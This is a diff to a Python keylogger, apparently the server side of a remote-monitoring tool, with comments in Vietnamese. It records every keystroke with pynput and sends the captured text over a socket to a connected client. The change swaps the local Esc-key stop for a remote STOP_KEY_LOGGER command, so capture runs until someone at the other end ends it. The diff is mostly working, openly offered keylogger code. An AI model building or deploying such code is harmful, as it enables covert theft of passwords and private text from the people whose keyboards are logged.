@@ -1,13 +1,17 @@
-# key_logger_server.py
 from pynput import keyboard
+import socket
+import threading
 
 def start_keylogger(client_socket):
-    # Biến để lưu trữ các ký tự đã nhấn
     keys_pressed = ""
     MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng
+    stop_keylogger = False  # Biến để kiểm soát việc dừng keylogger
 
     def on_press(key):
-        nonlocal keys_pressed  # Sử dụng biến keys_pressed trong phạm vi hàm
+        nonlocal keys_pressed, stop_keylogger  # Sử dụng biến keys_pressed và stop_keylogger trong phạm vi hàm
+
+        if stop_keylogger:
+            return False  # Dừng listener
 
         if hasattr(key, 'char') and key.char is not None:
             key_str = key.char  # Lấy ký tự từ phím nhấn
@@ -16,13 +20,11 @@ def start_keylogger(client_socket):
 
         # Nếu phím nhấn là Enter
         if key == keyboard.Key.enter:
-            # In ra các phím đã nhấn mà không tạo dòng mới
             print(f'\rKeys pressed: {keys_pressed}')  # In ra trên cùng một dòng
             keys_pressed = ""  # Reset sau khi nhấn Enter
             print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
         else:
-            # Cập nhật chuỗi ký tự đã nhấn và in ra trên cùng một dòng
-            keys_pressed += key_str
+            keys_pressed += key_str  # Cập nhật chuỗi ký tự đã nhấn
             
             # Nếu chuỗi ký tự quá dài, xuống dòng mới mà không lặp lại ký tự
             if len(keys_pressed) > MAX_LINE_LENGTH:
@@ -37,29 +39,27 @@ def start_keylogger(client_socket):
             print(f'Error when sending data to client: {e}')
             return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu
 
-    def on_release(key):
-        if key == keyboard.Key.esc:
-            print("\nKeylogger stopped by user.")
-            client_socket.sendall("STOP_KEY_LOGGER".encode())  # Gửi lệnh dừng về server
-            return False  # Dừng listener
-
-    # Bắt đầu lắng nghe sự kiện phím nhấn và thả    
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        try:
-            listener.join()  # Chờ cho listener hoàn thành
-        except Exception as e:
-            print(f"Error in listener: {e}")
-            
-    # Lắng nghe lệnh từ client để dừng keylogger
-    try:
-        while True:
-            data = client_socket.recv(1024)
-            command = data.decode("utf-8")
-            if command == "STOP_KEY_LOGGER":
-                print("\nReceived stop command from client. Stopping keylogger...")
+    # Lắng nghe phím nhấn từ client
+    def listen_for_commands():
+        nonlocal stop_keylogger
+        while not stop_keylogger:
+            try:
+                data = client_socket.recv(1024)
+                command = data.decode("utf-8")
+                if command == "STOP_KEY_LOGGER":
+                    print("\nReceived stop command from client. Stopping keylogger...")
+                    stop_keylogger = True  # Đánh dấu dừng keylogger
+                    break
+            except Exception as e:
+                print(f"Error receiving command from client: {e}")
                 break
-    except Exception as e:
-        print(f"Error receiving command from client: {e}")        
 
-    # Gửi thông báo đến client khi keylogger dừng
-    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
+    # Bắt đầu lắng nghe sự kiện phím nhấn
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()  # Bắt đầu lắng nghe phím nhấn
+
+    # Bắt đầu lắng nghe lệnh từ client
+    listen_for_commands()
+
+    listener.stop()  # Dừng listener
+    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))  # Gửi thông báo đến client khi keylogger dừng
